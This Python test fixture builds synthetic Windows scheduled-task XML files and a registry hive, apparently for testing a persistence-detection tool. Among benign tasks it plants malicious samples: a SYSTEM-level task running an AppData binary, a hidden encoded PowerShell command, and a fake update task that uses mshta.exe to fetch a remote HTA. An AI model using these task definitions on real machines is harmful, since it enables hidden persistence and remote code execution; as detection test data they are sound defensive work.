"""Synthetic Tasks tree + SOFTWARE hive for the windows_tasks test-suite."""

from __future__ import annotations

from pathlib import Path

from _hive_synth import build_software_hive


def _task_xml(uri, author, *, command, arguments="", run_as="S-1-5-18",
              run_level="LeastPrivilege", hidden=False, date="2026-02-01T03:14:00",
              triggers="<LogonTrigger><Enabled>true</Enabled></LogonTrigger>",
              com_class=""):
    action = (f"<ComHandler><ClassId>{com_class}</ClassId></ComHandler>"
              if com_class else
              f"<Exec><Command>{command}</Command>"
              + (f"<Arguments>{arguments}</Arguments>" if arguments else "")
              + "</Exec>")
    return f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{date}</Date>
    <Author>{author}</Author>
    <URI>{uri}</URI>
  </RegistrationInfo>
  <Triggers>{triggers}</Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{run_as}</UserId>
      <RunLevel>{run_level}</RunLevel>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
    <Hidden>{"true" if hidden else "false"}</Hidden>
  </Settings>
  <Actions Context="Author">
    {action}
  </Actions>
</Task>
"""


def _write(base: Path, rel_path: str, xml: str):
    p = base / rel_path.lstrip("\\").replace("\\", "/")
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(b"\xff\xfe" + xml.encode("utf-16-le"))
    return p


def build_root(root: Path, *, with_hive=True) -> Path:
    tasks = root / "Windows/System32/Tasks"

    _write(tasks, "\\Microsoft\\Windows\\Defender\\GoodScan",
           _task_xml("\\Microsoft\\Windows\\Defender\\GoodScan",
                     "Microsoft Corporation",
                     command="%ProgramFiles%\\Windows Defender\\MpCmdRun.exe",
                     arguments="-Scan"))

    _write(tasks, "\\EvilPersist",
           _task_xml("\\EvilPersist", "",
                     command="C:\\Users\\victim\\AppData\\Roaming\\svc.exe",
                     arguments="-k",
                     run_as="S-1-5-18", run_level="HighestAvailable"))

    _write(tasks, "\\HiddenBackdoor",
           _task_xml("\\HiddenBackdoor", "admin",
                     command="powershell.exe",
                     arguments="-nop -w hidden -enc SQBFAFgAKAAn"
                               "AGgAdAB0AHAAOgAvAC8AJwApAA==",
                     hidden=True))

    _write(tasks, "\\Microsoft\\Windows\\UpdateOrchestrator\\SysUpdate",
           _task_xml("\\Microsoft\\Windows\\UpdateOrchestrator\\SysUpdate", "",
                     command="mshta.exe",
                     arguments="https://45.9.148.20/u.hta"))

    _write(tasks, "\\XmlOnlyJob",
           _task_xml("\\XmlOnlyJob", "corp\\it",
                     command="C:\\Windows\\System32\\defrag.exe",
                     arguments="C: -o"))

    if with_hive:
        cfg = root / "Windows/System32/config"
        cfg.mkdir(parents=True, exist_ok=True)
        (cfg / "SOFTWARE").write_bytes(build_software_hive())
    return root
